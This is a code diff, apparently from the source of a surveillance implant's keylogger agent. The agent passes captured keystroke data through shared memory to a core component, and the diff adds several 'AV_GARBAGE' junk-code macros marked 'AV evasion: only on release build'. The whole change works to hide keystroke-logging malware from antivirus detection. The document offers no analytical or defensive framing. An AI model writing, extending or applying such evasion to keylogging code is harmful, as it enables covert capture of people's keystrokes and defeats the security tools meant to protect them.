@@ -257,16 +257,24 @@ static int height  = 30;
       [entryData appendData: contentData];
       
       // AV evasion: only on release build
-      AV_GARBAGE_001
+      AV_GARBAGE_003
       
       shMemoryHeader->status          = SHMEM_WRITTEN;
       shMemoryHeader->agentID         = AGENT_KEYLOG;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       shMemoryHeader->direction       = D_TO_CORE;
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       shMemoryHeader->commandType     = CM_LOG_DATA;
       shMemoryHeader->commandDataSize = [entryData length];
       
       // AV evasion: only on release build
-      AV_GARBAGE_001
+      AV_GARBAGE_008
       
       memcpy(shMemoryHeader->commandData,
              [entryData bytes],
